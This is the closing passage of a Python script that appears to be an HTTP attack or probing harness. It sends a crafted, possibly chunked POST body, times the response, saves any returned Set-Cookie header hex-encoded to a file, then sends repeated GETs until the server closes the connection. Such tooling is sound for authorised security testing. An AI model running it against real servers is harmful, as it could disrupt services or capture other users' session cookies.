                    out["chain9_error"] = "over wirecap %d" % len(body); break
                out["t_chain9"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
                r = c.post(a.path, body, a.chunked, maxread=8 << 20)
                sc = r["headers"].get("set-cookie", "")
                out["chain9"] = {"na": na, "npred": npred, "depth": depth,
                                 "k": k, "nb": nb, "status": r["status"],
                                 "ttfb": r["ttfb"], "total": r["total"],
                                 "body": r["body"][:300].decode("latin-1", "replace"),
                                 "set_cookie_len": len(sc), "closed": r["closed"]}
                open(COOKIE_OUT, "w").write(("Set-Cookie: " + sc).encode().hex())
            elif st == "drain":
                for i in range(a.ndrain):
                    r = c.get(a.path)
                    out.setdefault("drain", []).append({"i": i, "status": r["status"],
                                                        "closed": r["closed"]})
                    if r["closed"]:
                        break
                    time.sleep(a.gap)
            if c.closed and st not in ("arm",):
                out.setdefault("closed_at", st)
                break
            if st != "arm":
                time.sleep(a.gap)
    finally:
        c.close()
    print(json.dumps(out, indent=1))
    if a.json:
        open(a.json, "w").write(json.dumps(out, indent=1))


if __name__ == "__main__":
    main()
